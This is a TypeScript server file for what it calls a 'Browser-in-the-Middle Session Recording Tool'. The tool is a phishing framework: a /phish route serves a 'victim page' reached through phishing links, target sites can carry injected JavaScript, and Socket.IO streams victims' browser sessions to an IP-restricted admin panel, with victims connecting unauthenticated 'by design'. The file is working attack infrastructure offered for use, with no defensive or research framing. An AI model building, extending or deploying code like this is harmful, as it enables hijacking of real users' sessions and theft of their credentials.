import { readFile } from 'fs/promises';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import Fastify from 'fastify';
import { Server } from 'socket.io';
import fastifyStatic from '@fastify/static';
import { z } from 'zod';
import type { Config, Target, ClientToServerEvents, ServerToClientEvents, SocketData } from './types.js';
import { initBrowserManager, warmUp, closeAll } from './browser-manager.js';
import { registerSocketHandlers } from './socket-handlers.js';

const __dirname = dirname(fileURLToPath(import.meta.url));

// ═══════════════════════════════════════════════════════════════════════════════
// Configuration Validation Schemas
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Zod schema for validating config.json structure.
 * Ensures all required fields are present and have correct types.
 */
const ConfigSchema = z.object({
  default_user_agent: z.string(),
  socket_key: z.string().min(8),
  admin_ips: z.array(z.string()),
  proxy: z.string().nullable(),
});

/**
 * Zod schema for validating individual target configuration.
 */
const TargetSchema = z.object({
  name: z.string(),
  url: z.string().url(),
  width: z.number().int().positive(),
  height: z.number().int().positive(),
  inject_js: z.string().optional(),
});

/**
 * Zod schema for validating targets.json structure.
 * Expects a record/object where keys are target IDs and values are Target objects.
 */
const TargetsSchema = z.record(TargetSchema);

// ═══════════════════════════════════════════════════════════════════════════════
// Configuration Loading
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Loads and validates the main application configuration from config.json.
 * 
 * @returns Validated Config object
 * @throws Error if config.json is missing, malformed, or fails validation
 */
async function loadConfig(): Promise<Config> {
  const configPath = join(__dirname, '..', 'config.json');
  const raw = await readFile(configPath, 'utf-8');
  return ConfigSchema.parse(JSON.parse(raw));
}

/**
 * Loads and validates target site configurations from targets.json.
 * 
 * @returns Record mapping target IDs to Target configurations
 * @throws Error if targets.json is missing, malformed, or fails validation
 */
async function loadTargets(): Promise<Record<string, Target>> {
  const targetsPath = join(__dirname, '..', 'targets.json');
  const raw = await readFile(targetsPath, 'utf-8');
  return TargetsSchema.parse(JSON.parse(raw));
}

// ═══════════════════════════════════════════════════════════════════════════════
// Main Server Initialization
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Main application entry point.
 * Initializes Fastify server, Socket.IO, browser manager, and all routes.
 */
async function main(): Promise<void> {
  // Load configuration files in parallel for faster startup
  const [config, targets] = await Promise.all([loadConfig(), loadTargets()]);

  const publicDir = join(__dirname, '..', 'public');

  // ─── Fastify HTTP Server Setup ──────────────────────────────────────────────

  const fastify = Fastify({
    logger: {
      level: 'info',
      transport: { target: 'pino-pretty', options: { colorize: true } },
    },
  });

  // Serve static files (HTML, CSS, JS) from public/ directory
  await fastify.register(fastifyStatic, {
    root: publicDir,
    prefix: '/',
  });

  // ─── Socket.IO Setup ────────────────────────────────────────────────────────

  /**
   * Socket.IO server attached to Fastify's underlying HTTP server.
   * 
   * Configuration:
   * - CORS: Allow all origins (adjust for production)
   * - Transport: WebSocket only (polling mangles binary frame data)
   * - Type-safe: Uses TypeScript event maps for compile-time safety
   */
  const io = new Server<ClientToServerEvents, ServerToClientEvents, Record<string, never>, SocketData>(
    fastify.server,
    {
      cors: { origin: '*', methods: ['GET', 'POST'] },
      transports: ['websocket'], // polling mangles binary frame data
    },
  );

  // ─── HTTP Routes ────────────────────────────────────────────────────────────

  /**
   * GET /phish
   * Serves the victim page (victim.html).
   * This is the page victims are redirected to via phishing links.
   */
  fastify.get('/phish', async (_req, reply) => {
    return reply.sendFile('victim.html');
  });

  /**
   * GET /admin
   * Serves the admin control panel (admin.html).
   * Access is restricted to IPs listed in config.admin_ips.
   * Use ['*'] in config to allow all IPs (development only).
   */
  fastify.get('/admin', async (req, reply) => {
    const ip = req.ip;
    if (!config.admin_ips.includes(ip) && !config.admin_ips.includes('*')) {
      return reply.code(403).send('Forbidden');
    }
    return reply.sendFile('admin.html');
  });

  /**
   * GET /healthz
   * Health check endpoint for monitoring/load balancers.
   * Returns 200 OK with JSON status.
   */
  fastify.get('/healthz', async () => ({ status: 'ok' }));

  // ─── Socket.IO Authentication Middleware ────────────────────────────────────

  /**
   * Socket.IO middleware for authentication and role assignment.
   * 
   * Authentication flow:
   * - Admin: Must connect from allowed IP AND provide correct socket_key
   * - Victim: No authentication required (by design)
   * 
   * Sets socket.data.isAdmin based on authentication result.
   */
  io.use((socket, next) => {
    const auth = socket.handshake.auth as { password?: string; isAdmin?: boolean };
    const ip = socket.handshake.address;

    if (auth.isAdmin) {
      // Admin authentication: check IP whitelist AND socket key
      const isAdminIp =
        config.admin_ips.includes(ip) || config.admin_ips.includes('*');
      const hasCorrectKey = auth.password === config.socket_key;
      if (!isAdminIp || !hasCorrectKey) {
        return next(new Error('Unauthorized'));
      }
      socket.data.isAdmin = true;
    } else {
      // Victim: no authentication required
      socket.data.isAdmin = false;
    }

    return next();
  });

  // ─── Browser Manager Initialization ─────────────────────────────────────────

  /**
   * Initialize browser manager with config and thumbnail callback.
   * The thumbnail callback broadcasts thumbnails to all connected admins.
   */
  initBrowserManager(config, (browserId, buf) => {
    io.to('admin').emit('thumbnail', { browserId, data: buf });
  });

  /**
   * Pre-warm a browser instance for faster victim onboarding.
   * This creates a ready-to-use browser that can be claimed immediately
   * when the first victim connects, reducing initial load time.
   */
  await warmUp();

  /**
   * Register all Socket.IO event handlers for admin and victim connections.
   * This sets up the bidirectional communication protocol.
   */
  registerSocketHandlers(io, targets);

  // ─── Start HTTP Server ──────────────────────────────────────────────────────

  const port = parseInt(process.env['PORT'] ?? '80', 10);
  const host = process.env['HOST'] ?? '0.0.0.0';

  await fastify.listen({ port, host });
  
  // ASCII splash art
  console.log('\n');
  console.log('  ███████╗██╗     ██╗██████╗ ██████╗  ██████╗  ██████╗ ██╗  ██╗');
  console.log('  ██╔════╝██║     ██║██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝');
  console.log('  █████╗  ██║     ██║██████╔╝██████╔╝██║   ██║██║   ██║█████╔╝ ');
  console.log('  ██╔══╝  ██║     ██║██╔═══╝ ██╔══██╗██║   ██║██║   ██║██╔═██╗ ');
  console.log('  ██║     ███████╗██║██║     ██████╔╝╚██████╔╝╚██████╔╝██║  ██╗');
  console.log('  ╚═╝     ╚══════╝╚═╝╚═╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝');
  console.log('');
  console.log('  Browser-in-the-Middle Session Recording Tool');
  console.log('  ─────────────────────────────────────────────────────────────');
  console.log(`  Server:      http://${host}:${port}`);
  console.log(`  Admin Panel: http://localhost:${port}/admin`);
  console.log(`  Victim Page: http://localhost:${port}/phish`);
  console.log('');

  // ─── Graceful Shutdown Handler ──────────────────────────────────────────────

  /**
   * Graceful shutdown handler for SIGINT (Ctrl+C) and SIGTERM.
   * 
   * Cleanup sequence:
   * 1. Close all browser instances (saves sessions, releases resources)
   * 2. Close Fastify server (stops accepting new connections)
   * 3. Exit process with code 0
   */
  const shutdown = async () => {
    console.log('\n[server] Shutting down...');
    await closeAll();
    await fastify.close();
    process.exit(0);
  };

  process.on('SIGINT', () => void shutdown());
  process.on('SIGTERM', () => void shutdown());
}

// ═══════════════════════════════════════════════════════════════════════════════
// Application Entry Point
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Start the application.
 * Catches and logs any fatal errors during initialization.
 */
main().catch((err) => {
  console.error('[server] Fatal error:', err);
  process.exit(1);
});